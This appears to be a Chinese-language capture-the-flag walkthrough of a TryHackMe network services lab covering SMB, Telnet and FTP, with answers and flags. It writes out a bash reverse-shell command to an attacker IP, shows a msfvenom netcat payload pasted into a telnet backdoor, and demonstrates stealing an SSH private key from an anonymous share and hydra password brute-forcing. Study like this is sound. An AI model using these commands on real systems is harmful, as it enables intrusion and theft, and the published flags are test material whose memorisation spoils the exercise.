# Network Services

**🌐 網路服務**

THM路徑：https://tryhackme.com/room/networkservices

---

>> #### Task 1：建立聯繫

>> #### Task 2：瞭解 SMB

<details>
<summary><strong>伺服器訊息塊協定（SMB）</strong></summary>

- Server Message Block<br><strong>是一種用來在網路中分享資源的通訊協定</strong>

✅ 功能包括：
- 檔案共享（File Sharing）
- 印表機共享（Printer Sharing）
- 存取串列埠（Serial Port）
- 管道與 API 存取（Named Pipes / APIs）

---

SMB 讓「用戶端」能從遠端「像操作本機一樣」存取伺服器上的資源
</details>

<details>
<summary><strong>SMB 運作方式</strong></summary>

- SMB 是一種「**請求-回應協定**（Response-Request Protocol）」
- 用戶端（Client）和伺服器（Server）透過多次訊息互動建立連線
- 通訊協定底層可透過：
  - **TCP/IP（最常見，含 NetBIOS over TCP/IP）**
  - NetBEUI（較舊）
  - IPX/SPX（較罕見）

---

建立連線後，用戶端可以：

- 開啟遠端共享資料夾
- 閱讀 / 寫入檔案
- 操作共享印表機或資源
- 像使用自己電腦一樣操作伺服器資源（但是在網路上完成的！）

</details>


<details>
<summary><strong> 💻 誰在使用 SMB？</strong></summary>

| 作業系統 / 工具 | 說明 |
|----------------|------|
| **Windows**    | 從 Windows 95 開始即內建 SMB 支援 |
| **Samba**      | 開源實作，讓 Linux/Unix 也能支援 SMB 協定（可當成 SMB 伺服器） |

🧠 延伸知識

- SMB 也常見於內網滲透測試中，如利用漏洞進行：
    - **SMB Relay 攻擊**
    - **未授權存取共享資料夾**
    - **利用弱密碼登入取得資料**
- 知名漏洞：EternalBlue（MS17-010） 針對 SMB

</details>

##### 🔐 答題：
1. What does SMB stand for?  
   
   SMB 代表什麼？
   
&nbsp;&nbsp;&nbsp;&nbsp; `Server Message Block`

2. What type of protocol is SMB?
   
   SMB 是什麼類型的協定？
   
&nbsp;&nbsp;&nbsp;&nbsp; `response-request`

3. What protocol suite do clients use to connect to the server?    
   
   用戶端使用什麼協定套件連接到伺服器？
   
&nbsp;&nbsp;&nbsp;&nbsp; `TCP/IP`

4. What systems does Samba run on? 
   
   Samba 可以在哪些系統上運行？
   
&nbsp;&nbsp;&nbsp;&nbsp; `Unix`



>> #### Task 3：枚舉 SMB

- **`nmap` ：掃描網路開放的服務與主機**

| 功能             | 指令                                      | 解說                             |
|------------------|-------------------------------------------|----------------------------------|
| 探測主機是否在線 | `nmap -sn 192.168.1.0/24`                 | 只 Ping 掃，不掃 port（-sn = --sP） |
| 快速掃描常見 port | `nmap <IP>`                               | 掃描 1000 個常見 port             |
| 全 Port 掃描     | `nmap -p- <IP>`                            | 掃 0~65535 所有 port              |
| 指定 Port        | `nmap -p 22,80,443 <IP>`                  | 只掃特定 port                     |
| 指定 Port        | `nmap -sV -p 21 <IP>`                     | 掃描特定 port 的版本              |


- **`enum4linux`：枚舉（列舉）Windows SMB 資訊**

| 參數 | 功能說明 |
|------|----------|
| `-U` | 獲取使用者清單（User list） |
| `-M` | 獲取機器名稱清單（Machine list） |
| `-N` | 傾印名稱清單（Name list dump，與 `-U`、`-M` 不同） |
| `-S` | 獲取共享資源清單（Share list） |
| `-P` | 顯示密碼政策資訊（Password policy） |
| `-G` | 顯示群組與成員清單（Group + Members） |
| `-a` | 執行以上所有功能（全自動基本列舉） |


---

Question 1、2：對靶機執行`nmap`掃描，找到 3 個 Port 和 SMB 在哪個 Port 上運行

<p align="left">
  <img src="/rooms/images/11_01.jpg" width="600">
</p>

Question 3：對靶機執行`enum4linux`，枚舉靶機的 SMB 資訊，得到工作群組名稱
<p align="left">
  <img src="/rooms/images/11_02.jpg" width="600">
</p>

Question 4：在 NetBIOS Name Table 中，機器的名稱會出現在 `00`、`03`、`20`。
結合 OS Information，判斷主機名稱為`POLOSMB`。

- `<00>`  Workstation Service（工作站服務名稱）<br>→ 通常代表主機名稱
- `<03>` Messenger Service（訊息傳遞）
- `<20>`  File Server Service（檔案分享服務）<br>→ 檔案伺服器名稱

<p align="left">
  <img src="/rooms/images/11_03.jpg" width="600">
</p>

<p align="left">
  <img src="/rooms/images/11_07.jpg" width="600">
</p>

Question 5：查看系統版本
<p align="left">
  <img src="/rooms/images/11_04.jpg" width="600">
</p>

Question 6：靶機允許匿名登錄 <br>
`username''`、`password''`

`/profiles Mapping: OK, Listing: OK`<br>`

- 「Mapping」= 允許掛載（連線）到該 SMB 分享
- 「Listing」= 允許列出該分享資料夾的檔案與內容

<p align="left">
  <img src="/rooms/images/11_05.jpg" width="600">
</p>

<p align="left">
  <img src="/rooms/images/11_06.jpg" width="600">
</p>

##### 🔐 答題：
1. Conduct an nmap scan of your choosing, How many ports are open?
   
    執行您選擇的 nmap 掃描，打開了多少個埠？
   
&nbsp;&nbsp;&nbsp;&nbsp; `3`

2. What ports is SMB running on? Provide the ports in ascending order.
   
    SMB 在哪些埠上運行？按升序提供埠。
   
&nbsp;&nbsp;&nbsp;&nbsp; `139/445`

3. Let's get started with Enum4Linux, conduct a full basic enumeration. For starters, what is the workgroup name?    
   
    讓我們從 Enum4Linux 開始，進行一個完整的基本枚舉。工作群組名稱是什麼？
   
&nbsp;&nbsp;&nbsp;&nbsp; `WORKGROUP`

4. What comes up as the name of the machine? 
   
    機器的名稱是什麼？
   
&nbsp;&nbsp;&nbsp;&nbsp; `POLOSMB`

5. What operating system version is running?    
   
    運行的是什麼作系統版本 ？
   
&nbsp;&nbsp;&nbsp;&nbsp; `6.1`

6. What share sticks out as something we might want to investigate?    
   
    哪些分享資料夾值得我們調查？
   
&nbsp;&nbsp;&nbsp;&nbsp; `profiles`

>> #### Task 4：利用 SMB

`smbclient`： 連接 SMB 分享的命令列工具

`smbclient //[IP]/[SHARE] -User -Port`

---

Question 3：透過`smbclient`匿名訪問靶機後，輸入`help`確認可以使用哪些指令：

<p align="left">
  <img src="/rooms/images/11_08.png" width="600">
</p>

Question 4：輸入`more "Working From Home Information.txt` 讀取該文字檔：

<p align="left">
  <img src="/rooms/images/11_09.png" width="600">
</p>

Question 5、6：SMB 共享之 profiles 屬於 John Cactus 且公司還為他配置 ssh 服務：（按`Q`退出`more`模式）

<p align="left">
  <img src="/rooms/images/11_10.png" width="600">
</p>

Question 7：前往 .ssh 資料夾輸入`get id_rsa`下載私鑰到虛擬機上

- 查看 .ssh 文件夾：「id_rsa」文件為私鑰、「id_rsa.pub」文件為公鑰
- 在 「id_rsa.pub」 公鑰文件的內容末尾，可能會注明和密鑰相關的ssh用戶名稱
- 在 SMB 連接中，使用`get`命令下載文件

<p align="left">
  <img src="/rooms/images/11_11.png" width="600">
</p>

Question 8：更改 id_rsa 為 600

<p align="left">
  <img src="/rooms/images/11_12.jpg" width="600">
</p>


- Linux 權限說明：

| 數字 | 對應權限 | 說明       |
|------|----------|------------|
| 7    | rwx      | 讀寫執行   |
| 6    | rw-      | 讀寫       |
| 5    | r-x      | 讀 + 執行  |
| 4    | r--      | 只有讀     |
| 0    | ---      | 無權限     |

- `600` 意思為：

| 使用者       | 權限          |
|--------------|---------------|
| 擁有者（你） | 讀 & 寫 ✅    |
| 群組         | 沒有 ❌       |
| 其他人       | 沒有 ❌       |

Question 8：Task 3 透過`enum4linux`枚舉，發現有效帳戶名稱為 cactus，並嘗試以其私鑰 id_rsa 登入 ssh 服務


<p align="left">
  <img src="/rooms/images/11_13.png" width="600">
</p>

<p align="left">
  <img src="/rooms/images/11_14.png" width="600">
</p>

登入後，以 `ls` 列出檔案，`cat` smb.txt，獲得 Flag 🎉🎉

<p align="left">
  <img src="/rooms/images/11_15.png" width="600">
</p>


##### 🔐 答題：
1. What would be the correct syntax to access an SMB share called "secret" as user "suit" on a machine with the IP 10.10.10.2 on the default port?
   
    在預設埠上具有 IP 為 10.10.10.10.2 的電腦上，以使用者「suit」身份訪問名為「secret」的 SMB 共用的正確語法是什麼？
   
&nbsp;&nbsp;&nbsp;&nbsp; `smbclient //10.10.10.2/secret -U suit -p 445`

3. Does the share allow anonymous access? Y/N?
   
    共用是否允許匿名訪問？是/否？
   
&nbsp;&nbsp;&nbsp;&nbsp; `Y`

4. Great! Have a look around for any interesting documents that could contain valuable information. Who can we assume this profile folder belongs to?
   
    太好了！環顧四周，尋找任何可能包含有價值資訊的有趣文檔。我們可以假設這個配置檔資料夾屬於誰？
   
&nbsp;&nbsp;&nbsp;&nbsp; `John Cactus`

5. What service has been configured to allow him to work from home?
   
    配置了哪些服務以允許他在家工作？
   
&nbsp;&nbsp;&nbsp;&nbsp; `ssh`

6. Okay! Now we know this, what directory on the share should we look in?
   
    好！現在我們知道了，我們應該查看共用上的哪個目錄？
   
&nbsp;&nbsp;&nbsp;&nbsp; `.ssh`

7. This directory contains authentication keys that allow a user to authenticate themselves on, and then access, a server. Which of these keys is most useful to us?
   
    此目錄包含允許使用者在伺服器上對自己進行身份驗證，然後訪問伺服器的身份驗證密鑰。這些鍵中哪一個對我們最有用？
   
&nbsp;&nbsp;&nbsp;&nbsp; `id_rsa`

8. What is the smb.txt flag?
   
    什麼是 smb.txt 的旗子？
   
&nbsp;&nbsp;&nbsp;&nbsp; `THM{smb_is_fun_eh?}`

>> #### Task 5：瞭解 Telnet
連線語法：`telnet [ip] [port]”`

---

Telnet 漏洞類型（Types of Telnet Exploit）

1. Telnet 本身的不安全性：
    - ❌ **沒加密** → 所有資料明文傳送（帳密可被攔截）
    - ❌ **存取控制薄弱** → 常見弱密碼或匿名登入
    - ❌ **常被錯誤設定** → 最容易被攻擊的點！
2. CVE 漏洞庫（可查 Telnet 相關漏洞）
    - https://www.cvedetails.com/
    - https://cve.mitre.org/<br>CVE（Common Vulnerabilities and Exposures）是已公開安全漏洞編號，每編號對應一種弱點。
3. ✅ 實戰中更常遇到的情況是：
    - 配置錯誤（如帳號沒設密碼、用戶名硬編在服務裡）
    - 被當作後門或 debug 用途埋在奇怪 port

##### 🔐 答題：
1. What is Telnet?      
   
   什麼是 Telnet？
   
&nbsp;&nbsp;&nbsp;&nbsp; `application protocol`

2. What has slowly replaced Telnet?     
   
    是什麼慢慢取代了 Telnet？
   
&nbsp;&nbsp;&nbsp;&nbsp; `ssh`

3. How would you connect to a Telnet server with the IP 10.10.10.3 on port 23?
   
    您將如何連接到埠 23 上 IP 為 10.10.10.3 的 Telnet 伺服器？
   
&nbsp;&nbsp;&nbsp;&nbsp; `telnet 10.10.10.3 23`

4. The lack of what, means that all Telnet communication is in plaintext?  
   
    缺少什麼，意味著所有 Telnet 通信都是明文的？
   
&nbsp;&nbsp;&nbsp;&nbsp; `encryption`


>> #### Task 6：枚舉 Telnet

Question 1 - 4：`nmap -p- 靶機IP` 進行全端口掃描，發現 8012 端口有開；`nmap 靶機IP` 快速掃瞄 1000 個常用端口，未發現開啟端口。

<p align="left">
  <img src="/rooms/images/11_16.png" width="600">
</p>

Question 6、7：進階掃描 8012 端口 `nmap -A -p 8012 -T4 靶機IP`

- fingerprint-string：**指紋字串**，是 nmap 主動送出一些常見的連線請求，看伺服器回什麼反應
- X11Probe：nmap 嘗試模仿「X11 圖形界面」的連線行為，結果**有回應（正規服務不該有反應）**
- SKIDY'S BACKDOOR：8012 port 上可能藏有漏洞或惡意服務！

<p align="left">
  <img src="/rooms/images/11_17.png" width="600">
</p>

##### 🔐 答題：
1. How many ports are open on the target machine?    
   
    目標計算機上打開了多少個埠 ？
   
&nbsp;&nbsp;&nbsp;&nbsp; `1`

2. What port is this?
   
    這是什麼埠 ？
   
&nbsp;&nbsp;&nbsp;&nbsp; `8012`

3. This port is unassigned, but still lists the protocol it's using, what protocol is this?     
   
    此埠未分配，但仍列出它使用的協定 ，這是什麼協定？
   
&nbsp;&nbsp;&nbsp;&nbsp; `tcp`

4. Now re-run the nmap scan, without the -p- tag, how many ports show up as open?
   
    現在重新運行 nmap 掃描，沒有 -p- 標籤，有多少個埠顯示為打開？
   
&nbsp;&nbsp;&nbsp;&nbsp; `0`

6. Based on the title returned to us, what do we think this port could be used for?
   
    根據返回給我們的標題，我們認為這個埠可以用來做什麼 ？
   
&nbsp;&nbsp;&nbsp;&nbsp; `a backdoor`

7. Who could it belong to? Gathering possible usernames is an important step in enumeration.
   
    它可能屬於誰？收集可能的使用者名是枚舉中的一個重要步驟。
   
&nbsp;&nbsp;&nbsp;&nbsp; `Skidy`

>> #### Task 7：利用 Telnet

- Reverse Shell

| 項目 | 說明 |
|:---|:---|
| 🔷 Shell | 控制終端，可執行指令的介面（如 Bash、CMD） |
| 🔷 Reverse Shell | 被控主機主動連線回攻擊者主機，建立 shell |
| 🔷 攻擊者 | 開一個監聽 port（用 `nc -lvnp` 等），等待連線 |
| 🔷 被控端 | 通過 `telnet`、`nc`、`bash`、`python` 等方式，反向打回連線到攻擊端 |
| ✅ 優勢 | 能繞過某些防火牆，避免被監控系統阻擋 |

---

- 反制者端

反制者主機啟動監聽： `nc -lvnp 4444`

使用 nc（Netcat）開啟監聽：

| 參數 | 解釋 |
|:---|:---|
| `-l` | listen 模式 |
| `-v` | verbose（顯示更多細節） |
| `-n` | 不做 DNS 查詢 |
| `-p 4444` | 指定監聽 port（可自選） |

- 目標者端

目標端執行反彈指令（如成功登 telnet 或 shell）:<br>
`bash -i >& /dev/tcp/[antiattacker_ip]/4444 0>&1`

| 組件 | 解釋 |
|:---|:---|
| `bash -i` | 啟動互動式 bash shell |
| `>& /dev/tcp/[antiattacker_ip]/4444` | 把 stdout 與 stderr 轉送到 TCP 連線上（這個位置是特殊的 bash 機制） |
| `0>&1` | 把 stdin 也導向那個連線，形成完整的雙向通訊 |

結果：目標主機會主動「打回你這邊」，你就會在你的 Netcat 介面看到一個 shell 🎉<br>
`Connection received on [antiattacker_ip] 4444
bash-5.0$`

<p align="left">
  <img src="/rooms/images/11_18.png" width="600">
</p>

Question 2、3：透過提示得知 8012 端口為 telnet 服務，`telnet 目標IP 8012`。歡迎訊息為`SKIDY'S BACKDOOR`。連線後嘗試`whoami`指令，無反應。

<p align="left">
  <img src="/rooms/images/11_19.png" width="600">
</p>

Question 6：另開終端機，`sudo tcpdump ip proto \\icmp -i ens5`，選擇偵聽 ens5 網卡的流量。

<p align="left">
  <img src="/rooms/images/11_20.png" width="600">
</p>

從`telnet`介面`.RUN ping 虛擬機IP -c 1`，查看是否能夠在目標機的telnet服務器上執行系統命令。

<p align="left">
  <img src="/rooms/images/11_22.png" width="600">
</p>

虛擬機監聽到兩條記錄，說明目標機 `ping` 虛擬機成功。

<p align="left">
  <img src="/rooms/images/11_21.png" width="600">
</p>

Question 8：另開終端機，使用 `msfvenom` 生成一個 netcat 反向 shell 有效 payload，最下面那段為 payload。

<p align="left">
  <img src="/rooms/images/11_23.png" width="600">
</p>

Question 9：在虛擬機上開啟 `netcat` 監聽，並在 `telnet` 介面貼上有效 payload。

<p align="left">
  <img src="/rooms/images/11_24.png" width="600">
</p>
<p align="left">
  <img src="/rooms/images/11_25.png" width="600">
</p>

Question 11：成功在虛擬機上取得 shell，並查看靶機上 flag.txt 文件，獲得 Flag 🎉🎉

<p align="left">
  <img src="/rooms/images/11_26.png" width="600">
</p>

##### 🔐 答題：
2. Great! It's an open telnet connection! What welcome message do we receive?
   
    很好！這是一個開放的 telnet 連接！我們會收到什麼歡迎資訊？
   
&nbsp;&nbsp;&nbsp;&nbsp; `SKIDY'S BACKDOOR.`

3. Let's try executing some commands, do we get a return on any input we enter into the telnet session? (Y/N)
   
    讓我們嘗試執行一些命令，我們輸入到 telnet 工作階段中的任何輸入都會得到回報嗎？（是/否）
   
&nbsp;&nbsp;&nbsp;&nbsp; `N`

6. Now, use the command "ping [local THM ip] -c 1" through the telnet session to see if we're able to execute system commands. Do we receive any pings? Note, you need to preface this with .RUN (Y/N)
   
    現在，通過 telnet 會話使用命令 「ping [local THM ip] -c 1」 來查看我們是否能夠執行系統命令。我們是否收到任何 ping？請注意，您需要在此前面加上 。執行 （Y/N）
   
&nbsp;&nbsp;&nbsp;&nbsp; `Y`

8. What word does the generated payload start with?
   
    生成的有效負載以什麼單詞開頭？

&nbsp;&nbsp;&nbsp;&nbsp; `mkfifo`

9. What would the command look like for the listening port we selected in our payload?
   
    我們在有效負載中選擇的偵聽埠的命令會是什麼樣子的？

&nbsp;&nbsp;&nbsp;&nbsp; `nc -lvnp 4444`

11. Success! What is the contents of flag.txt?
   
    成功！flag.txt 的內容是什麼？

&nbsp;&nbsp;&nbsp;&nbsp; `THM{y0u_g0t_th3_t3ln3t_fl4g}`

>> #### Task 8：瞭解 FTP
- **FTP (File Transfer Protocol)**：
透過網路傳輸檔案 的通訊協定，採 用戶端-伺服器架構

<details>
<summary><strong>FTP 如何運作？（使用雙通道）</strong></summary>

| 通道類型 | Port | 功能說明 |
|:----|:----|:----|
| Command（命令）通道 | 21 | 傳送指令與伺服器的回應 |
| Data（資料）通道 | 20 | 負責實際檔案資料的傳輸 |


避免指令與資料混在一起，提高效率。<br>
FTP 採  Client-Server（用戶端－伺服器）模型

---

- FTP 工作流程簡述：
1. 客戶端對伺服器發起連線
2. 輸入帳號密碼（或匿名登入）
3. 開啟工作階段（session）
4. 使用 FTP 指令操作（如 `ls`, `get`, `put` 等）

---

- 🔧 主動（Active）vs 被動（Passive）

| 模式 | 說明 |
|:----|:----|
| Active | 客戶端開啟 port 等伺服器連線（**伺服器主動連回來**） |
| Passive | 伺服器開啟 port 供客戶端連入（**伺服器被動等連線，較防火牆友善**） |


Passive 模式在現代應用中更常見，尤其是在 NAT、防火牆後面時。

</details>

##### 🔐 答題：
1. What communications model does FTP use?
   
   FTP 使用什麼通信模型？
   
&nbsp;&nbsp;&nbsp;&nbsp; `client-server`

2. What's the standard FTP port?
   
   準的 FTP 連接埠是什麼？
   
&nbsp;&nbsp;&nbsp;&nbsp; `21`

3. How many modes of FTP connection are there?    
   
   FTP 連接有幾種模式？
   
&nbsp;&nbsp;&nbsp;&nbsp; `2`

>> #### Task 9：枚舉 FTP

Question 1 - 3：對靶機執行`nmap -sC -sV -T4 <IP>`掃描
- `-sC` 使用 Nmap 的預設腳本 (default scripts) 來掃描目標，快速檢查常見弱點
- `-sV` 掃描指定的 port，並嘗試探測服務版本

<p align="left">
  <img src="/rooms/images/11_27.png" width="600">
</p>

- 靶機開放兩個端口
- ftp 在 21端口上運行，
- 目標機上所運行的FTP是：vsftpd

Question 4、5嘗試匿名登入 ftp，列出檔案後，`get PUBLIC_NOTICE.txt -`（不加「-」，會直接下載到虛擬機），取得可能使用者名稱：Mike

<p align="left">
  <img src="/rooms/images/11_28.png" width="600">
</p>

##### 🔐 答題：
1. How many ports are open on the target machine? 
   
   目標計算機上打開了多少個埠？
   
&nbsp;&nbsp;&nbsp;&nbsp; `2`(正解為 2，如不行嘗試輸入 1)

2. What port is ftp running on?
   
   ftp 在哪個埠上運行？
   
&nbsp;&nbsp;&nbsp;&nbsp; `21`

3. What variant of FTP is running on it?  
   
   它上運行的 FTP 是什麼變體 ？
   
&nbsp;&nbsp;&nbsp;&nbsp; `vsftpd`

4. What is the name of the file in the anonymous FTP directory?

   它上運行的 FTP 是什麼變體 ？
   
&nbsp;&nbsp;&nbsp;&nbsp; `PUBLIC_NOTICE.txt`

5. What do we think a possible username

   我們認為可能的使用者名是什麼
   
&nbsp;&nbsp;&nbsp;&nbsp; `mike`

>> #### Task 11：利用 FTP

<details>
<summary><strong>FTP 的安全性問題</strong></summary>

- **所有資料明文傳輸**（帳號、密碼、檔案能被攔截）
- 因此現今多改用 SFTP 或 FTPS 來加密傳輸

---

-  為什麼 FTP 危險？<br>
FTP 像 Telnet 一樣，是 「明文傳輸」 協定：
   - 傳送的帳號、密碼、檔案內容 **沒加密**
   - 容易被<strong>中間人攻擊（MITM)</strong>攔截
   - 攻擊者可透過 **ARP 欺騙 + 封包嗅探 獲得敏感資訊**

---

- 在滲透測試中，FTP 很常成為突破口，尤其當存在：
  - 弱密碼 / 預設密碼
  - 匿名登入
  - 未妥善設定權限
  - 檔案上傳未限制（上傳木馬或反向 shell）
  - 權限過寬（可瀏覽系統敏感目錄）

- 滲透測試中 FTP 常見用途：
   - 匿名登入（帳號：anonymous）
   - 檔案可讀取 / 寫入（未設權限）
   - 機密資訊洩露（憑證、設定檔、shell script）
   - 作為攻擊者上傳反向 shell 的跳板

---

- 某些舊版 FTP 服務在未登入前，執行 cwd（切換目錄）時會回應不同錯誤訊息。<br>
- 如果 cwd 回應成功，就代表該使用者目錄存在 → 可能是有效帳號。<br>
- 雖然這是舊漏洞（legacy），但在靶機或真實環境中仍有機會遇到。

---

- 爆破密碼：<br>
很多 FTP 預設帳密沒改過（如 admin:admin）<br>
沒加密、沒防爆破 → 很適合用來練手暴力破解！

</details>

**Hydra：密碼爆破工具**<br>

爆破 FTP 密碼（單帳號）範例：
`hydra -l dale -P /usr/share/wordlists/rockyou.txt -vV ftp://10.10.10.6`

爆破 SSH（多帳號）範例：
`hydra -L users.txt -P passwords.txt -vV ssh://10.10.10.6`

| 參數 | 說明 |
|:----|:----|
| `-l <帳號>` | 指定一個帳號（單一帳號測試） |
| `-L <檔案>` | 指定帳號清單檔案（多個帳號爆破） |
| `-p <密碼>` | 指定一個密碼（單一密碼測試） |
| `-P <檔案>` | 指定密碼清單檔案（多個密碼爆破） |
| `-C <檔案>` | 指定帳號:密碼格式的清單檔案（login:pass 格式） |
| `-t 4` | 每個目標開幾個連線並行（預設 16，可調整） |
| `-s <port>` | 指定非預設 port（例如 FTP 改其他 port） |
| `-e nsr` | 嘗試 null 密碼 (n)、帳號=密碼 (s)、反轉 (r) |
| `-vV` | 超詳細輸出，每一組帳密都顯示 |
| `-f` | 找到就停止（單一目標） |
| `-F` | 找到就停止（多目標） |
| `-o <檔案>` | 將成功結果寫入檔案 |

---

Question 1：用`hydra`爆破密碼<br>
`hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV [目標IP] ftp`

<p align="left">
  <img src="/rooms/images/11_29.png" width="600">
</p>

Question 3：登入 ftp 列出檔案，讀取 flag.txt，獲得 Flag 🎉🎉（不加「-」，會直接下載到虛擬機）

<p align="left">
  <img src="/rooms/images/11_30.png" width="600">
</p>

##### 🔐 答題：
1. What is the password for the user "mike"?
   
   使用者 「mike」 的密碼是什麼？
   
&nbsp;&nbsp;&nbsp;&nbsp; `password`

3. What is ftp.txt?
   
   什麼是 ftp.txt？
   
&nbsp;&nbsp;&nbsp;&nbsp; `THM{y0u_g0t_th3_ftp_fl4g}`